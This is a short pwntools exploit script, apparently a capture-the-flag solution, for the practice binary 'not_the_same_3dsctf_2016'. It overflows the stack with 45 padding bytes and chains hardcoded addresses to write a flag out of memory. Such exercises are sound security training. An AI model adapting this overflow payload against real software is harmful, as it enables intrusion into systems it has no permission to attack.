#Made by fly_autumn
#x86 ret2syscall
from pwn import *
p = process("./not_the_same_3dsctf_2016")
elf = ELF("./not_the_same_3dsctf_2016")
context(os="linux",arch="i386")

offset = 45
func_plt = 0x80489a0
write_plt = 0x806e270
flag_addr = 0x80eca2d
exit_plt = 0x804e66d
payload = b"\x00" * 45 + p32(func_plt) + p32(write_plt) + p32(exit_plt) + p32(1) + p32(flag_addr) + p32(50)
p.sendline(payload)

p.interactive()
